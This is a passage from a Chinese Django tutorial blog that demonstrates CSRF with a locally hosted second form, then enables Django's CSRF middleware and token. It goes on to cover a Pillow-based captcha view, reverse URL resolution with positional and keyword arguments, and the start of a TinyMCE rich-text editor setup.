HttpResponse(&#x27;发帖失败&#x27;)</span><br></pre></td></tr></table></figure>

<p>2）打开 booktest&#x2F;urls.py 文件，配置 url。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^login/$&#x27;, views.login),</span><br><span class="line">url(r&#x27;^login_check/$&#x27;, views.login_check),</span><br><span class="line">url(r&#x27;^post/$&#x27;, views.post),</span><br><span class="line">url(r&#x27;^post_action/$&#x27;,views.post_action),</span><br></pre></td></tr></table></figure>

<p>3）在 <code>templates/booktest/</code> 目录下创建 <code>login.html</code> 和 <code>post.html</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">login.html</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;登录案例&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form method=&quot;post&quot; action=&quot;/login_check/&quot;&gt;</span><br><span class="line">    用户名：&lt;input type=&quot;text&quot; name=&quot;username&quot;/&gt;&lt;br/&gt;</span><br><span class="line">    密码：&lt;input type=&quot;password&quot; name=&quot;password&quot;/&gt;&lt;br/&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">post.html</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;发帖页&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form method=&quot;post&quot; action=&quot;/post_action/&quot;&gt;</span><br><span class="line">    标题:&lt;input type=&quot;text&quot; name=&quot;title&quot;/&gt;&lt;br/&gt;</span><br><span class="line">    内容:&lt;textarea name=&quot;content&quot;&gt;&lt;/textarea&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;发帖&quot;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>4）启动运行服务器，采用 IP 的方式，因为要演示其它 IP 的请求。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 manage.py runserver 192.168.141.130:8000</span><br></pre></td></tr></table></figure>

<p>5）回到 windows 中，在浏览器中输入如下网址，将这个标签称为网站 A。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8000/post/</span><br></pre></td></tr></table></figure>

<p>浏览效果如下图：</p>
<img src="/2020/01/04/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E6%9D%BF/2020-01-05-23-08-38.png" class="">

<p>输入用户名和密码，点击登录，效果如下图：</p>
<img src="/2020/01/04/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E6%9D%BF/2020-01-05-23-09-09.png" class="">

<p>6）下面使用 windows 中使用 Django 模拟一个网站，创建 <code>post.html</code>，复制 <code>templates/booktest/post.html</code> 内容，并修改 <code>action</code> 路径。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;发帖页&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form method=&quot;post&quot; action=&quot;http://192.168.141.130:8000/post_action/&quot;&gt;</span><br><span class="line">  标题:&lt;input type=&quot;text&quot; name=&quot;title&quot;/&gt;&lt;br/&gt;</span><br><span class="line">  内容:&lt;textarea name=&quot;content&quot;&gt;&lt;/textarea&gt;</span><br><span class="line">  &lt;input type=&quot;submit&quot; value=&quot;发帖&quot;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>7）在 windows 中浏览器查看效果如下图，将这个标签称为网站 B。</p>
<img src="/2020/01/04/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E6%9D%BF/2020-01-05-23-12-25.png" class="">

<p>8）Django 项目中默认启用了 csrf 保护，现在先禁用，打开 <code>test4/settings.py</code> 文件，注释掉 csrf 中间件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MIDDLEWARE_CLASSES = (</span><br><span class="line">    &#x27;django.contrib.sessions.middleware.SessionMiddleware&#x27;,</span><br><span class="line">    &#x27;django.middleware.common.CommonMiddleware&#x27;,</span><br><span class="line">    # &#x27;django.middleware.csrf.CsrfViewMiddleware&#x27;,# 禁用</span><br><span class="line">    &#x27;django.contrib.auth.middleware.AuthenticationMiddleware&#x27;,</span><br><span class="line">    &#x27;django.contrib.auth.middleware.SessionAuthenticationMiddleware&#x27;,</span><br><span class="line">    &#x27;django.contrib.messages.middleware.MessageMiddleware&#x27;,</span><br><span class="line">    &#x27;django.middleware.clickjacking.XFrameOptionsMiddleware&#x27;,</span><br><span class="line">    &#x27;django.middleware.security.SecurityMiddleware&#x27;,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>9）点击游览器的第一个标签即网站 A，点击”发帖”按钮后如下图：</p>
<img src="/2020/01/04/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E6%9D%BF/2020-01-05-23-14-10.png" class="">

<p>10）点击游览器的第二个标签即 IIS 网站 B，点击“发帖”按钮后如下图：</p>
<img src="/2020/01/04/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E6%9D%BF/2020-01-05-23-14-52.png" class="">

<p>对比上面两张图，发现无论从网站 A 还是网站 B 都可以访问网站 A 的 post_action 视图，这就是不安全的。</p>
<h2 id="防止-CSRF"><a href="#防止-CSRF" class="headerlink" title="防止 CSRF"></a>防止 CSRF</h2><p>1）Django 提供了 csrf 中间件用于防止 CSRF 攻击，只需要在 <code>test4/settings.py</code> 中启用 csrf 中间件即可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MIDDLEWARE_CLASSES = (</span><br><span class="line">    &#x27;django.contrib.sessions.middleware.SessionMiddleware&#x27;,</span><br><span class="line">    &#x27;django.middleware.common.CommonMiddleware&#x27;,</span><br><span class="line">    &#x27;django.middleware.csrf.CsrfViewMiddleware&#x27;, # 启用csrf中间件</span><br><span class="line">    &#x27;django.contrib.auth.middleware.AuthenticationMiddleware&#x27;,</span><br><span class="line">    &#x27;django.contrib.auth.middleware.SessionAuthenticationMiddleware&#x27;,</span><br><span class="line">    &#x27;django.contrib.messages.middleware.MessageMiddleware&#x27;,</span><br><span class="line">    &#x27;django.middleware.clickjacking.XFrameOptionsMiddleware&#x27;,</span><br><span class="line">    &#x27;django.middleware.security.SecurityMiddleware&#x27;,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>2）回到 windows 浏览器中，分别在网站 A、网站 B 中点击“提交”按钮，效果一样，如下图：</p>
<img src="/2020/01/04/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E6%9D%BF/2020-01-05-23-18-52.png" class="">

<p>3）接下来 <code>templates/booktest/post.html</code>内容，在 form 表单中使用标签 <code>csrf_token</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;发帖页&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form method=&quot;post&quot; action=&quot;/post_action/&quot;&gt;</span><br><span class="line">    &#123;% csrf_token %&#125;</span><br><span class="line">    标题:&lt;input type=&quot;text&quot; name=&quot;title&quot;/&gt;&lt;br/&gt;</span><br><span class="line">    内容:&lt;textarea name=&quot;content&quot;&gt;&lt;/textarea&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;发帖&quot;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>4）回到 windows 浏览器中，在网站 A 中点击“提交”按钮，效果如下图：</p>
<img src="/2020/01/04/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E6%9D%BF/2020-01-05-23-24-25.png" class="">

<p>好了，Django 中成功完成 CSRF 防护。</p>
<h2 id="保护原理"><a href="#保护原理" class="headerlink" title="保护原理"></a>保护原理</h2><p>加入标签后，可以查看 post.html 的源代码，发现多了一个隐藏域。</p>
<img src="/2020/01/04/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E6%9D%BF/2020-01-05-23-50-30.png" class="">

<p>在浏览器的“开发者工具”中查看 cookie 信息。</p>
<img src="/2020/01/04/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E6%9D%BF/2020-01-05-23-51-13.png" class="">

<p>说明：当启用中间件并加入标签 csrf_token 后，会向客户端浏览器中写入一条 Cookie 信息，这条信息的值与隐藏域 input 元素的 value 属性是一致的，提交到服务器后会先由 csrf 中间件进行验证，如果对比失败则返回 403 页面，而不会进行后续的处理。</p>
<h1 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h1><h2 id="手动实现验证码"><a href="#手动实现验证码" class="headerlink" title="手动实现验证码"></a>手动实现验证码</h2><p>1）安装包 Pillow3.4.1。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install Pillow</span><br></pre></td></tr></table></figure>

<p>点击查看<a href="http://pillow.readthedocs.io/en/3.4.x/">PIL 模块 API</a>，以下代码中用到了 Image、ImageDraw、ImageFont 对象及方法。</p>
<p>2）在 booktest&#x2F;views.py 文件中，创建视图 verify_code。</p>
<ul>
<li>提示 1：随机生成字符串后存入 session 中，用于后续判断。</li>
<li>提示 2：视图返回 mime-type 为 image&#x2F;png。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from PIL import Image, ImageDraw, ImageFont</span><br><span class="line">from django.utils.six import BytesIO</span><br><span class="line">...</span><br><span class="line">def verify_code(request):</span><br><span class="line">    #引入随机函数模块</span><br><span class="line">    import random</span><br><span class="line">    #定义变量，用于画面的背景色、宽、高</span><br><span class="line">    bgcolor = (random.randrange(20, 100), random.randrange(</span><br><span class="line">        20, 100), 255)</span><br><span class="line">    width = 100</span><br><span class="line">    height = 25</span><br><span class="line">    #创建画面对象</span><br><span class="line">    im = Image.new(&#x27;RGB&#x27;, (width, height), bgcolor)</span><br><span class="line">    #创建画笔对象</span><br><span class="line">    draw = ImageDraw.Draw(im)</span><br><span class="line">    #调用画笔的point()函数绘制噪点</span><br><span class="line">    for i in range(0, 100):</span><br><span class="line">        xy = (random.randrange(0, width), random.randrange(0, height))</span><br><span class="line">        fill = (random.randrange(0, 255), 255, random.randrange(0, 255))</span><br><span class="line">        draw.point(xy, fill=fill)</span><br><span class="line">    #定义验证码的备选值</span><br><span class="line">    str1 = &#x27;ABCD123EFGHIJK456LMNOPQRS789TUVWXYZ0&#x27;</span><br><span class="line">    #随机选取4个值作为验证码</span><br><span class="line">    rand_str = &#x27;&#x27;</span><br><span class="line">    for i in range(0, 4):</span><br><span class="line">        rand_str += str1[random.randrange(0, len(str1))]</span><br><span class="line">    #构造字体对象，ubuntu的字体路径为“/usr/share/fonts/truetype/freefont”</span><br><span class="line">    font = ImageFont.truetype(&#x27;FreeMono.ttf&#x27;, 23)</span><br><span class="line">    #构造字体颜色</span><br><span class="line">    fontcolor = (255, random.randrange(0, 255), random.randrange(0, 255))</span><br><span class="line">    #绘制4个字</span><br><span class="line">    draw.text((5, 2), rand_str[0], font=font, fill=fontcolor)</span><br><span class="line">    draw.text((25, 2), rand_str[1], font=font, fill=fontcolor)</span><br><span class="line">    draw.text((50, 2), rand_str[2], font=font, fill=fontcolor)</span><br><span class="line">    draw.text((75, 2), rand_str[3], font=font, fill=fontcolor)</span><br><span class="line">    #释放画笔</span><br><span class="line">    del draw</span><br><span class="line">    #存入session，用于做进一步验证</span><br><span class="line">    request.session[&#x27;verifycode&#x27;] = rand_str</span><br><span class="line">    #内存文件操作</span><br><span class="line">    buf = BytesIO()</span><br><span class="line">    #将图片保存在内存中，文件类型为png</span><br><span class="line">    im.save(buf, &#x27;png&#x27;)</span><br><span class="line">    #将内存中的图片数据返回给客户端，MIME类型为图片png</span><br><span class="line">    return HttpResponse(buf.getvalue(), &#x27;image/png&#x27;)</span><br></pre></td></tr></table></figure>

<p>3）打开 booktest&#x2F;urls.py 文件，配置 url。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^verify_code/$&#x27;, views.verify_code),</span><br></pre></td></tr></table></figure>

<p>4）运行服务器，在浏览器中输入如下网址，效果图如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8000/verify_code/</span><br></pre></td></tr></table></figure>

<img src="/2020/01/04/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E6%9D%BF/2020-01-06-23-39-53.png" class="">

<h2 id="调用验证码"><a href="#调用验证码" class="headerlink" title="调用验证码"></a>调用验证码</h2><p>1）在 booktest&#x2F;views.py 文件中，创建视图 verify_show。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def verify_show(request):</span><br><span class="line">    return render(request,&#x27;booktest/verify_show.html&#x27;)</span><br></pre></td></tr></table></figure>

<p>2）打开 booktest&#x2F;urls.py 文件，配置 url。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^verify_show/$&#x27;, views.verify_show),</span><br></pre></td></tr></table></figure>

<p>3）在 templates&#x2F;booktest&#x2F;目录下创建 verify_show.html。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;验证码&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form method=&quot;post&quot; action=&quot;/verify_yz/&quot;&gt;</span><br><span class="line">    &#123;%csrf_token%&#125;</span><br><span class="line">    &lt;input type=&quot;text&quot; name=&quot;yzm&quot;&gt;</span><br><span class="line">    &lt;img id=&quot;yzm&quot; src=&quot;/verify_code/&quot;/&gt;</span><br><span class="line">    &lt;span id=&quot;change&quot;&gt;看不清，换一个&lt;/span&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>4）运行服务器，在浏览器中输入如下网址,效果图如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8000/verify_show/</span><br></pre></td></tr></table></figure>

<img src="/2020/01/04/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E6%9D%BF/2020-01-06-23-54-38.png" class="">

<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>1）在 booktest&#x2F;views.py 文件中，创建视图 verify_yz。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def verify_yz(request):</span><br><span class="line">    yzm = request.POST.get(&#x27;yanzhengma&#x27;)</span><br><span class="line">    verifycode = request.session[&#x27;verifycode&#x27;]</span><br><span class="line">    response = HttpResponse(yzm + &quot; &quot; + verifycode)</span><br><span class="line"></span><br><span class="line">    if yzm.upper() == verifycode.upper():</span><br><span class="line">        response = HttpResponse(&#x27;OK&#x27;)</span><br><span class="line">    return response</span><br></pre></td></tr></table></figure>

<p>2）打开 booktest&#x2F;urls.py 文件，配置 url。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^verify_yz/$&#x27;, views.verify_yz),</span><br></pre></td></tr></table></figure>

<p>3）回到浏览器后刷新，在文本框中填写验证码，点击提交按钮。</p>
<img src="/2020/01/04/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E6%9D%BF/2020-01-07-00-32-11.png" class="">

<img src="/2020/01/04/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E6%9D%BF/2020-01-07-00-32-32.png" class="">

<h1 id="反向解析"><a href="#反向解析" class="headerlink" title="反向解析"></a>反向解析</h1><p>反向解析应用在两个地方：模板中的超链接，视图中的重定向。</p>
<h2 id="示例-7"><a href="#示例-7" class="headerlink" title="示例"></a>示例</h2><p>1）在 <code>test4/urls.py</code> 中为 include 定义 namespace 属性。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^&#x27;,include(&#x27;booktest.urls&#x27;,namespace=&#x27;booktest&#x27;)),</span><br></pre></td></tr></table></figure>

<p>2）在 <code>booktest/urls.py</code> 中为 url 定义 name 属性，并修改为 fan2。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^fan2/$&#x27;, views.fan2,name=&#x27;fan2&#x27;),</span><br></pre></td></tr></table></figure>

<p>3）在模板中使用 url 标签做超链接，此处为 <code>templates/booktest/fan1.html</code> 文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;反向解析&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">普通链接：&lt;a href=&quot;/fan2/&quot;&gt;fan2&lt;/a&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">反向解析：&lt;a href=&quot;&#123;%url &#x27;booktest:fan2&#x27;%&#125;&quot;&gt;fan2&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>4）回到浏览器中，后退，刷新，查看源文件如下图，两个链接地址一样。</p>
<img src="/2020/01/04/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E6%9D%BF/2020-01-07-22-58-53.png" class="">

<p>5）在 <code>booktest/urls.py</code> 中，将 fan2 修改为 fan_show 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^fan_show/$&#x27;, views.fan2,name=&#x27;fan2&#x27;),</span><br></pre></td></tr></table></figure>

<p>6）回到浏览器中，刷新，查看源文件如下图，两个链接地址不一样。</p>
<img src="/2020/01/04/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E6%9D%BF/2020-01-07-23-00-17.png" class="">

<p>7）反向解析也可以应用在视图的重定向中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.shortcuts import redirect</span><br><span class="line">from django.core.urlresolvers import reverse</span><br><span class="line"></span><br><span class="line">return redirect(reverse(&#x27;booktest:fan2&#x27;))</span><br></pre></td></tr></table></figure>

<p>总结：在定义 url 时，需要为 include 定义 namespace 属性，为 url 定义 name 属性，使用时，在模板中使用 url 标签，在视图中使用 reverse 函数，根据正则表达式动态生成地址，减轻后期维护成本。</p>
<h2 id="URL-的参数"><a href="#URL-的参数" class="headerlink" title="URL 的参数"></a>URL 的参数</h2><p>有些 url 配置项正则表达式中是有参数的，接下来讲解如何传递参数。</p>
<h3 id="情况一：位置参数"><a href="#情况一：位置参数" class="headerlink" title="情况一：位置参数"></a>情况一：位置参数</h3><p>1）在 <code>booktest/urls.py</code> 中，添加 fan3 如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^fan(\d+)_(\d+)/$&#x27;, views.fan3,name=&#x27;fan3&#x27;),</span><br></pre></td></tr></table></figure>

<p>2）在 <code>booktest/views</code>中，定义视图 fan3 如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def fan3(request, a, b):</span><br><span class="line">    return HttpResponse(a+b)</span><br></pre></td></tr></table></figure>

<p>3）修改 <code>templates/booktest/fan1.html</code> 文件如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;反向解析&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">普通连接：&lt;a href=&quot;/fan2/&quot;&gt;fan2&lt;/a&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">反向解析：&lt;a href=&quot;&#123;% url &#x27;booktest:fan2&#x27; %&#125;&quot;&gt;fan2&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;hr&gt;</span><br><span class="line">位置参数：&lt;a href=&quot;&#123;% url &#x27;booktest:fan3&#x27; 1 3 %&#125;&quot;&gt;fan3&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>4）回到浏览器中，刷新，查看源文件如下图：</p>
<img src="/2020/01/04/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E6%9D%BF/2020-01-07-23-14-32.png" class="">

<p>使用重定向传递位置参数格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return redirect(reverse(&#x27;booktest:fan3&#x27;, args=(2,3)))</span><br></pre></td></tr></table></figure>

<h3 id="情况二：关键字参数"><a href="#情况二：关键字参数" class="headerlink" title="情况二：关键字参数"></a>情况二：关键字参数</h3><p>1）在 <code>booktest/urls.py</code> 中，修改 fan2 如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^fan(?P&lt;id&gt;\d+)_(?P&lt;age&gt;\d+)/$&#x27;, views.fan4,name=&#x27;fan2&#x27;),</span><br></pre></td></tr></table></figure>

<p>2）在 <code>booktest/views</code> 中，定义视图 fan4 如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def fan4(request, id, age):</span><br><span class="line">    return HttpResponse(id+age)</span><br></pre></td></tr></table></figure>

<p>3）修改 <code>templates/booktest/fan1.html</code> 文件如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;反向解析&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">普通连接：&lt;a href=&quot;/fan2/&quot;&gt;fan2&lt;/a&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">反向解析：&lt;a href=&quot;&#123;% url &#x27;booktest:fan2&#x27; %&#125;&quot;&gt;fan2&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;hr&gt;</span><br><span class="line">位置参数：&lt;a href=&quot;&#123;% url &#x27;booktest:fan3&#x27; 1 3 %&#125;&quot;&gt;fan3&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;hr&gt;</span><br><span class="line">关键字参数&lt;a href=&quot;&#123;% url &#x27;booktest:fan4&#x27; id=1 age=23 %&#125;&quot;&gt;fan4&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>4）回到浏览器中，刷新，查看源文件如下图：</p>
<img src="/2020/01/04/Django%E5%AD%A6%E4%B9%A0-%E6%A8%A1%E6%9D%BF/2020-01-07-23-19-25.png" class="">

<p>使用重定向传递关键字参数格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return redirect(reverse(&#x27;booktest:fan4&#x27;, kwargs=&#123;&#x27;id&#x27;:100,&#x27;age&#x27;:18&#125;))</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title>Django学习-第三方模块</title>
    <url>/2020/01/26/Django%E5%AD%A6%E4%B9%A0-%E7%AC%AC%E4%B8%89%E6%96%B9%E6%A8%A1%E5%9D%97/</url>
    <content><![CDATA[<h1 id="富文本编辑器"><a href="#富文本编辑器" class="headerlink" title="富文本编辑器"></a>富文本编辑器</h1><p>借助富文本编辑器，网站的编辑人员能够像使用 offfice 一样编写出漂亮的、所见即所得的页面。此处以 tinymce 为例，其它富文本编辑器的使用也是类似的。</p>
<p>在虚拟环境中安装包。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install django-tinymce==2.6.0</span><br></pre></td></tr></table></figure>

<p>安装完成后，可以使用在 Admin 管理中，也可以自定义表单使用。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>1）在 <code>test6/settings.py</code> 中为 INSTALLED_APPS 添加编辑器应用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSTALLED_APPS = (</span><br><span class="line">    ...</span><br><span class="line">    &#x27;tinymce&#x27;,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>2）在 <code>test6/settings.py</code> 中添加编辑器配置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TINYMCE_DEFAULT_CONFIG = &#123;</span><br><span class="line">    &#x27;theme&#x27;: &#x27;advanced&#x27;,</span><br><span class="line">    &#x27;width&#x27;: 600,</span><br><span class="line">    &#x27;height&#x27;: 400,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3）在 <code>test6/urls.py</code> 中配置编辑器 url。</p>
<p>urlpatterns &#x3D; [<br>…<br>url(r’^tinymce&#x2F;‘, include(‘tinymce.urls’)),<br>]</p>
<p>接下来介绍在 Admin 页面、自定义表单页面的使用方式。</p>
<h3 id="在-Admin-中使用"><a href="#在-Admin-中使用" class="headerlink" title="在 Admin 中使用"></a>在 Admin 中使用</h3><p>1）在 <code>booktest/models.py</code> 中，定义模型的属性为 <code>HTMLField()</code> 类型。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.db import models</span><br><span class="line">from tinymce.models import HTMLField</span><br><span class="line"></span><br><span class="line">class GoodsInfo(models.Model):</span><br><span class="line">    gcontent=HTMLField()</span><br></pre></td></tr></table></figure>

<p>2）生成迁移文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python manage.py makemigrations</span><br><span class="line">python manage.py migrate</span><br></pre></td></tr></table></figure>

<p>4）在本示例中没有定义其它的模型类，但是数据库中有这些表，提示是否删除，输入 no 后回车，表示不删除，因为其它的示例中需要使用这些表。</p>
<img src="/2020/01/26/Django%E5%AD%A6%E4%B9%A0-%E7%AC%AC%E4%B8%89%E6%96%B9%E6%A8%A1%E5%9D%97/2020-01-27-21-28-05.png" class="">

<p>5）迁移完成，新开终端，连接 mysql ，使用 test2 数据库，查看表如下：</p>
<img src="/2020/01/26/Django%E5%AD%A6%E4%B9%A0-%E7%AC%AC%E4%B8%89%E6%96%B9%E6%A8%A1%E5%9D%97/2020-01-27-21-28-49.png" class="">

<p>6）发现并没有表 GoodsInfo ，解决办法是删除迁移表中关于 booktest 应用的数据。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delete from django_migrations where app=&#x27;booktest&#x27;;</span><br></pre></td></tr></table></figure>

<p>7）再次执行迁移。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python manage.py migrate</span><br></pre></td></tr></table></figure>

<p>成功完成迁移，记得不删除 no。</p>
<img src="/2020/01/26/Django%E5%AD%A6%E4%B9%A0-%E7%AC%AC%E4%B8%89%E6%96%B9%E6%A8%A1%E5%9D%97/2020-01-27-21-29-59.png" class="">

<p>8）在 <code>booktest/admin.py</code> 中注册模型类 GoodsInfo</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.contrib import admin</span><br><span class="line">from booktest.models import *</span><br><span class="line">class GoodsInfoAdmin(admin.ModelAdmin):</span><br><span class="line">    list_display = [&#x27;id&#x27;]</span><br><span class="line"></span><br><span class="line">admin.site.register(GoodsInfo,GoodsInfoAdmin)</span><br></pre></td></tr></table></figure>

<p>9）运行服务器，进入 admin 后台管理，点击 GoodsInfo 的添加，效果如下图</p>
<img src="/2020/01/26/Django%E5%AD%A6%E4%B9%A0-%E7%AC%AC%E4%B8%89%E6%96%B9%E6%A8%A1%E5%9D%97/2020-01-27-21-30-48.png" class="">

<p>在编辑器中编辑内容后保存。</p>
<h3 id="自定义使用"><a href="#自定义使用" class="headerlink" title="自定义使用"></a>自定义使用</h3><p>1）在 <code>booktest/views.py</code> 中定义视图 editor ，用于显示编辑器。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def editor(request):</span><br><span class="line">    return render(request, &#x27;booktest/editor.html&#x27;)</span><br></pre></td></tr></table></figure>

<p>2）在 <code>booktest/urls.py</code> 中配置 url 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^editor/&#x27;,views.editor),</span><br></pre></td></tr></table></figure>

<p>3）在项目目录下创建静态文件目录如下图：</p>
